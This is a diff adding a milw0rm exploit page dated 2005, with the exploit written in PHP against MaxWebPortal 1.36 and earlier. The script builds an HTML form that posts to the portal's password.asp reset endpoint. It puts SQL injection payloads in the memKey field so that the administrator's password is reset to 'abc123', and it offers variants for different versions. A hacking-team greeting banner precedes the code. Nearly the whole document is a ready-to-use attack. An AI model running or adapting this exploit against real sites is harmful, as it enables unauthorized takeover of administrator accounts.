@@ -1,0 +1,35 @@
+<html><head><title>Maxwebportal <= 1.36 password.asp Change Password Exploit (2 - php)</title></head><pre>&lt;?php
+/*
+------Trap-Set Underground Hacking Team-----------------mh_p0rtal---------------------- 
+Greetz to : Alpha_programmer , Oil_karchack , Str0ke   And Iranian Hacking &amp; Security Teams : 
+Alphast , IHS Team , Shabgard Security Team , Emperor Hacking TEam 
+, CrouZ Security Team , Simorgh-ev Security Team 
+----------------Discovered by: s d &lt;irsdl@yahoo.com&gt;------------------------------------------
+*/ 
+# Config ________________________________   
+# address - example: http://www.site.com/password.asp
+$url  = &quot;http://www.mohamad.com/password.asp&quot;;  
+$mh = &quot;s1&quot;;   
+# if webmaxportal version is : Version 1.35 and older please input $mh= &quot;s1&quot; 
+# if webmaxportal version is : Version 1.36 , 2.0 please input $mh= &quot;s2&quot; 
+# EnD ___________________________________
+if ( $mh == &quot;s1&quot; ) {
+print &quot;&lt;form action=\&quot;$url?mode=reset\&quot; method=\&quot;post\&quot;&gt; &lt;br&gt; &quot;;
+print &quot;Password1 : &lt;input name=\&quot;pass\&quot; type=\&quot;text\&quot; value=\&quot;abc123\&quot; size=\&quot;50\&quot;&gt;&lt;br&gt;&quot;;
+print &quot;Confirm Pass: &lt;input name=\&quot;pass2\&quot; type=\&quot;text\&quot; value=\&quot;abc123\&quot; size=\&quot;50\&quot;&gt;&lt;br&gt;&quot;; 
+print &quot; ID  :&amp;nbsp&amp;nbsp&amp;nbsp &lt;input name=\&quot;memId\&quot; type=\&quot;text\&quot; value=\&quot;-1\&quot; size=\&quot;50\&quot;&gt;&lt;br&gt;&quot;; 
+print &quot;Member key: &lt;input name=\&quot;memKey\&quot; type=\&quot;text\&quot; value=\&quot;foo' or M_Name='admin\&quot; size=\&quot;50\&quot;&gt;&lt;br&gt;&quot;;
+print &quot;&lt;input name=\&quot;Submit\&quot; type=\&quot;submit\&quot; value=\&quot;:::Change Pass:::\&quot;&gt;&quot;;
+print &quot;&lt;/form&gt;&quot;;
+} if ( $mh == &quot;s2&quot; ) {
+print &quot;&lt;form action=\&quot;$url?mode=reset\&quot; method=\&quot;post\&quot;&gt; &lt;br&gt; &quot;;
+print &quot;Password1: &lt;input name=\&quot;pass\&quot; type=\&quot;text\&quot; value=\&quot;abc123\&quot; size=\&quot;50\&quot;&gt;&lt;br&gt;&quot;; 
+print &quot;Confirm Pass : &lt;input name=\&quot;pass2\&quot; type=\&quot;text\&quot; value=\&quot;abc123\&quot; size=\&quot;50\&quot;&gt;&lt;br&gt; &quot;;
+print &quot;ID  :  &amp;nbsp&amp;nbsp&amp;nbsp&lt;input name=\&quot;memId\&quot; type=\&quot;text\&quot; value=\&quot;-1\&quot; size=\&quot;50\&quot;&gt;&lt;br&gt; &quot;;
+print &quot;Member key: &lt;input name=\&quot;memKey\&quot; type=\&quot;text\&quot; value=\&quot;foo') or M_Name='admi n' or ('1'='2\&quot; size=\&quot;50\&quot;&gt; &lt;br&gt;&quot;; 
+print &quot;&lt;input name=\&quot;Submit\&quot; type=\&quot;submit\&quot; value=\&quot;:::Change Pass:::\&quot;&gt;&quot;;
+print &quot;&lt;/form&gt;&quot;;
+} 
+?&gt;
+
+# milw0rm.com [2005-05-26]</pre></html>
